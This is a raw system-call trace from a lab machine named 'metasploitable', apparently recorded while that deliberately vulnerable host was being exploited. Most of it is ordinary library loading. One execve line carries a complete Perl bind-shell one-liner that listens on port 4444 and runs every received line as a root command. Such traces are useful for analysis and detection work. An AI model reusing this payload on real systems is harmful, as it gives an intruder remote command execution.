11889 07:39:45.113344 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e32000
11889 07:39:45.113355 mmap2(0xb7e46000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7e46000
11889 07:39:45.113370 mmap2(0xb7e48000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e48000
11889 07:39:45.113385 close(1)          = 0
11889 07:39:45.113411 munmap(0xb7fd8000, 29913) = 0
11889 07:39:45.113428 open("/etc/ld.so.cache", O_RDONLY) = 1
11889 07:39:45.113441 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
11889 07:39:45.113457 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fd8000
11889 07:39:45.113467 close(1)          = 0
11889 07:39:45.113477 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11889 07:39:45.113492 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
11889 07:39:45.113505 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
11889 07:39:45.113622 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
11889 07:39:45.113654 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e28000
11889 07:39:45.113666 mmap2(0xb7e30000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7e30000
11889 07:39:45.113682 close(1)          = 0
11889 07:39:45.113694 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11889 07:39:45.113708 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
11889 07:39:45.113726 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
11889 07:39:45.113816 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
11889 07:39:45.113832 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e1d000
11889 07:39:45.113844 mmap2(0xb7e26000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7e26000
11889 07:39:45.113859 close(1)          = 0
11889 07:39:45.113880 munmap(0xb7fd8000, 29913) = 0
11889 07:39:45.113896 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
11889 07:39:45.113910 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
11889 07:39:45.113922 _llseek(1, 0, [0], SEEK_CUR) = 0
11889 07:39:45.113933 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
11889 07:39:45.113950 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7fdf000
11889 07:39:45.113960 _llseek(1, 1624, [1624], SEEK_SET) = 0
11889 07:39:45.113975 munmap(0xb7fdf000, 1624) = 0
11889 07:39:45.113985 close(1)          = 0
11889 07:39:45.114013 getpgrp()         = 3831
11889 07:39:45.114023 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
11889 07:39:45.114038 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
11889 07:39:45.114056 brk(0x8101000)    = 0x8101000
11889 07:39:45.114096 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
11889 07:39:45.114113 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
11889 07:39:45.114127 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
11889 07:39:45.114164 brk(0x8102000)    = 0x8102000
11889 07:39:45.114190 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
11889 07:39:45.114209 stat64("/sbin/AB", 0xbfffce58) = -1 ENOENT (No such file or directory)
11889 07:39:45.114221 stat64("/bin/AB", 0xbfffce58) = -1 ENOENT (No such file or directory)
11889 07:39:45.114232 stat64("/usr/sbin/AB", 0xbfffce58) = -1 ENOENT (No such file or directory)
11889 07:39:45.114244 stat64("/usr/bin/AB", 0xbfffce58) = -1 ENOENT (No such file or directory)
11889 07:39:45.114257 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
11889 07:39:45.114272 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e536f8) = 11890
11890 07:39:45.114315 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11890 07:39:45.114331 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
11890 07:39:45.114344 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
11890 07:39:45.114356 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
11890 07:39:45.114371 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
11890 07:39:45.114387 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
11890 07:39:45.114400 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
11890 07:39:45.114454 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
11890 07:39:45.114468 --- SIGPIPE (Broken pipe) @ 0 (0) ---
11890 07:39:45.114535 exit_group(127)   = ?
4519  07:39:45.120129 waitpid(11889,  <unfinished ...>
11889 07:39:45.131035 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11889 07:39:45.131077 --- SIGCHLD (Child exited) @ 0 (0) ---
11889 07:39:45.131094 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 11890
11889 07:39:45.131113 waitpid(-1, 0xbfffcad8, WNOHANG) = -1 ECHILD (No child processes)
11889 07:39:45.131124 sigreturn()       = ? (mask now [])
11889 07:39:45.131147 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
11889 07:39:45.131162 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11889 07:39:45.131173 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
11889 07:39:45.131185 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
11889 07:39:45.131203 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11889 07:39:45.131215 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
11889 07:39:45.131251 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
11889 07:39:45.131271 stat64("/sbin/perl", 0xbfffce88) = -1 ENOENT (No such file or directory)
11889 07:39:45.131283 stat64("/bin/perl", 0xbfffce88) = -1 ENOENT (No such file or directory)
11889 07:39:45.131295 stat64("/usr/sbin/perl", 0xbfffce88) = -1 ENOENT (No such file or directory)
11889 07:39:45.131307 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
11889 07:39:45.131325 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
11889 07:39:45.131350 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
11889 07:39:45.131364 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e536f8) = 11891
11891 07:39:45.151161 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11891 07:39:45.151185 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
11891 07:39:45.151198 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
11891 07:39:45.151210 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
11891 07:39:45.151239 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
11891 07:39:45.151254 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
11891 07:39:45.151266 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
11891 07:39:45.151302 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
11891 07:39:45.151393 brk(0)            = 0x8153000
11891 07:39:45.151414 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11891 07:39:45.151429 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f80000
11891 07:39:45.151445 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
11891 07:39:45.151461 open("/etc/ld.so.cache", O_RDONLY) = 1
11891 07:39:45.151473 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
11891 07:39:45.151490 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f78000
11891 07:39:45.151500 close(1)          = 0
11891 07:39:45.151511 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11891 07:39:45.151525 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
11891 07:39:45.151539 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
11891 07:39:45.151544 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
11891 07:39:45.151544 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f74000
11891 07:39:45.151544 mmap2(0xb7f76000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f76000
11891 07:39:45.151544 close(1)          = 0
11891 07:39:45.151545 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11891 07:39:45.151545 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
11891 07:39:45.151545 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
11891 07:39:45.151545 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
11891 07:39:45.151545 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f4f000
11891 07:39:45.151546 mmap2(0xb7f72000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f72000
11891 07:39:45.151556 close(1)          = 0
11891 07:39:45.151568 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11891 07:39:45.151613 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
11891 07:39:45.151644 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
11891 07:39:45.151729 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
11891 07:39:45.151745 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f4e000
11891 07:39:45.151757 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f36000
11891 07:39:45.151768 mmap2(0xb7f4a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f4a000
11891 07:39:45.151782 mmap2(0xb7f4c000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f4c000
11891 07:39:45.151795 close(1)          = 0
11891 07:39:45.151809 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11891 07:39:45.151822 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
11891 07:39:45.151836 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
11891 07:39:45.151922 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
11891 07:39:45.151939 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7de7000
11891 07:39:45.151950 mmap2(0xb7f30000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f30000
11891 07:39:45.151964 mmap2(0xb7f33000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f33000
11891 07:39:45.151977 close(1)          = 0
11891 07:39:45.151988 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11891 07:39:45.152001 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
11891 07:39:45.152014 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
11891 07:39:45.152149 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
11891 07:39:45.152183 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7db5000
11891 07:39:45.152194 mmap2(0xb7dbe000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7dbe000
11891 07:39:45.152208 mmap2(0xb7dc0000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7dc0000
11891 07:39:45.152221 close(1)          = 0
11891 07:39:45.152245 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7db4000
11891 07:39:45.152258 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7db48c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
11891 07:39:45.152326 mprotect(0xb7f30000, 4096, PROT_READ) = 0
11891 07:39:45.152352 munmap(0xb7f78000, 29913) = 0
11891 07:39:45.152368 set_tid_address(0xb7db4908) = 11891
11891 07:39:45.152377 set_robust_list(0xb7db4910, 0xc) = 0
11891 07:39:45.152386 futex(0xbfeb6b50, 0x81 /* FUTEX_??? */, 1) = 0
11891 07:39:45.152400 rt_sigaction(SIGRTMIN, {0xb7f3a2c0, [], SA_SIGINFO}, NULL, 8) = 0
11891 07:39:45.152413 rt_sigaction(SIGRT_1, {0xb7f3a340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
11891 07:39:45.152425 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
11891 07:39:45.152438 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
11891 07:39:45.152457 uname({sys="Linux", node="metasploitable", ...}) = 0
11891 07:39:45.152502 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
11891 07:39:45.152546 brk(0)            = 0x8153000
11891 07:39:45.152556 brk(0x8174000)    = 0x8174000
11891 07:39:45.152664 getuid32()        = 0
11891 07:39:45.152675 geteuid32()       = 0
11891 07:39:45.152684 getgid32()        = 0
11891 07:39:45.152694 getegid32()       = 0
11891 07:39:45.152743 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d93000
11891 07:39:45.152768 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
11891 07:39:45.152785 read(1, "\337\311\250H", 4) = 4
11891 07:39:45.152798 close(1)          = 0
11891 07:39:45.152816 time(NULL)        = 1495625985
11891 07:39:45.152857 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfeb6820) = -1 ENOENT (No such file or directory)
11891 07:39:45.152874 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfeb6820) = -1 ENOENT (No such file or directory)
11891 07:39:45.152886 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfeb6820) = -1 ENOENT (No such file or directory)
